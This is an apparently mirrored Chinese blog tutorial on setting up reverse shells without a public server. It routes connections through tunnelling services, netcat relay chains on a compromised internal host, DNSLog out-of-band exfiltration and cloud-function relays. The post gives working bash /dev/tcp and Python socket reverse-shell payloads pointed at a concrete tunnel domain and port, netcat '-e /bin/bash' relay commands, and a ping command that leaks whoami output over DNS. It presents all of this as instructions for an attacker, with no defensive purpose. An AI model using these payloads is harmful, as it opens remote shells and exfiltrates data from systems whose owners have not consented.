---
layout: post
title: "没有公网服务器的情况下,建立反弹-Shell"
date: 2025-03-13 15:50:56 +0800
description: "通过云服务（如AWS Lambda、腾讯云函数）作为中继节点。：通过第三方服务将内网端口映射到公网域名，绕过公网IP限制。：已有内网某主机的控制权，通过该主机转发流量。：目标机可访问外网但无法直接建立TCP连接。"
keywords: "没有公网服务器的情况下，建立反弹 Shell"
categories: ['未分类']
tags: ['运维', '网络', '服务器', '安全', 'Web']
artid: "146233458"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=146233458
    alt: "没有公网服务器的情况下,建立反弹-Shell"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=146233458
featuredImagePreview: https://bing.ee123.net/img/rand?artid=146233458
cover: https://bing.ee123.net/img/rand?artid=146233458
image: https://bing.ee123.net/img/rand?artid=146233458
img: https://bing.ee123.net/img/rand?artid=146233458
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     没有公网服务器的情况下，建立反弹 Shell
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="markdown_views prism-atom-one-dark" id="content_views">
    <svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
     <path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
     </path>
    </svg>
    <h4>
     <a id="1__1">
     </a>
     <strong>
      1. 使用内网穿透工具（推荐）
     </strong>
    </h4>
    <p>
     <strong>
      核心原理
     </strong>
     ：通过第三方服务将内网端口映射到公网域名，绕过公网IP限制。
     <br/>
     <strong>
      工具推荐
     </strong>
     ：
    </p>
    <ul>
     <li>
      <strong>
       贝锐花生壳
      </strong>
      （免费版可用）
      <ul>
       <li>
        注册账号并登录，选择「内网穿透」功能，添加TCP映射。
       </li>
       <li>
        设置映射类型为TCP，内网主机IP为本地（如
        <code>
         127.0.0.1
        </code>
        ），内网端口为监听的Shell端口（如54321）。
       </li>
       <li>
        生成外网域名和端口，目标机通过该域名端口反向连接攻击机。
       </li>
      </ul>
     </li>
     <li>
      <strong>
       cpolar
      </strong>
      （支持SSH穿透）
      <ul>
       <li>
        安装并配置SSH服务，结合cpolar生成公网访问地址，实现SSH反向连接。
       </li>
      </ul>
     </li>
    </ul>
    <p>
     <strong>
      操作步骤
     </strong>
     ：
    </p>
    <ol>
     <li>
      <strong>
       攻击机
      </strong>
      ：通过穿透工具生成公网地址（如
      <code>
       s546459d57.zicp.fun:23494
      </code>
      ）。
     </li>
     <li>
      <strong>
       目标机
      </strong>
      ：执行反弹Shell命令，如
      <code>
       bash -i &gt;&amp; /dev/tcp/s546459d57.zicp.fun/23494 0&gt;&amp;1
      </code>
      。
     </li>
     <li>
      <strong>
       攻击机
      </strong>
      ：使用
      <code>
       nc
      </code>
      监听穿透后的端口（如
      <code>
       nc -lvnp 23494
      </code>
      ），接收Shell。
     </li>
    </ol>
    <h4>
     <a id="2__16">
     </a>
     <strong>
      2. 利用中间代理服务器
     </strong>
    </h4>
    <p>
     <strong>
      场景
     </strong>
     ：已有内网某主机的控制权，通过该主机转发流量。
     <br/>
     <strong>
      工具
     </strong>
     ：
    </p>
    <ul>
     <li>
      <strong>
       Netcat（nc）
      </strong>
      ：通过多层端口转发建立链路。
      <ul>
       <li>
        内网主机A执行：
        <code>
         nc -lvp 4444 -e /bin/bash
        </code>
        。
       </li>
       <li>
        中间主机B（可出网）执行：
        <code>
         nc -lvp 5555 -e nc &lt;内网主机A_IP&gt; 4444
        </code>
        。
       </li>
       <li>
        攻击机连接中间主机的公网端口：`nc &lt;中间主机B_公网IP&gt; 5555。
       </li>
      </ul>
     </li>
     <li>
      <strong>
       lcx/htran
      </strong>
      ：适用于Windows内网环境，通过端口转发实现多层穿透。
     </li>
    </ul>
    <h4>
     <a id="3_DNSHTTPOOB_25">
     </a>
     <strong>
      3. 使用DNS或HTTP协议带外（OOB）
     </strong>
    </h4>
    <p>
     <strong>
      适用场景
     </strong>
     ：目标机可访问外网但无法直接建立TCP连接。
     <br/>
     <strong>
      工具
     </strong>
     ：
    </p>
    <ul>
     <li>
      <strong>
       DNSLog
      </strong>
      ：通过DNS查询传递Shell命令结果。
      <ul>
       <li>
        攻击机生成DNSLog子域名（如
        <code>
         xxx.dnslog.cn
        </code>
        ）。
       </li>
       <li>
        目标机执行：
        <code>
         ping $(whoami).xxx.dnslog.cn
        </code>
        ，通过DNS解析日志获取命令结果。
       </li>
      </ul>
     </li>
     <li>
      <strong>
       HTTP带外
      </strong>
      ：利用Web请求传递数据（需攻击机搭建Web服务）。
     </li>
    </ul>
    <h4>
     <a id="4__33">
     </a>
     <strong>
      4. 利用云函数或在线平台
     </strong>
    </h4>
    <p>
     <strong>
      原理
     </strong>
     ：通过云服务（如AWS Lambda、腾讯云函数）作为中继节点。
     <br/>
     <strong>
      步骤
     </strong>
     ：
    </p>
    <ol>
     <li>
      编写云函数，监听指定端口并转发流量至攻击机。
     </li>
     <li>
      目标机连接云函数生成的公网地址，实现反向Shell。
     </li>
    </ol>
    <h4>
     <a id="5_Shell_39">
     </a>
     <strong>
      5. 反弹Shell命令示例
     </strong>
    </h4>
    <p>
     <strong>
      Bash
     </strong>
     ：
    </p>
    <pre><code class="prism language-bash"><span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">&gt;&amp;</span> /dev/tcp/<span class="token operator">&lt;</span>穿透域名<span class="token operator">&gt;</span>/<span class="token operator">&lt;</span>穿透端口<span class="token operator">&gt;</span> <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
</code></pre>
    <p>
     <strong>
      Python
     </strong>
     ：
    </p>
    <pre><code class="prism language-python"><span class="token keyword">import</span> socket<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>os
s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"s546459d57.zicp.fun"</span><span class="token punctuation">,</span><span class="token number">23494</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>
subprocess<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span><span class="token string">"-i"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre>
   </div>
   <link href="../../assets/css/markdown_views-a5d25dd831.css" rel="stylesheet"/>
   <link href="../../assets/css/style-e504d6a974.css" rel="stylesheet"/>
  </div>
 </article>
 <p alt="68747470733a2f2f62:6c6f672e6373646e2e6e65742f71715f34363134333333392f:61727469636c652f64657461696c732f313436323333343538" class_="artid" style="display:none">
 </p>
</div>


